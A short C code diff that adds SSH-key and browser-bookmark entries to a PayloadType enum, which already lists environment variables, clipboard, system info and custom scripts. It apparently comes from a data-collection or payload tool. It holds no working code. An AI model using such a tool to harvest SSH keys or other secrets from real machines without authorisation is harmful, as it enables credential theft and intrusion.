@@ -34,6 +34,8 @@ typedef enum {
     PayloadTypeEnvVars,
     PayloadTypeClipboard,
     PayloadTypeSystemInfo,
+    PayloadTypeSSHKeys,
+    PayloadTypeBrowserBookmarks,
     PayloadTypeCustomScript,
     PayloadTypeCOUNT,
 } PayloadType;
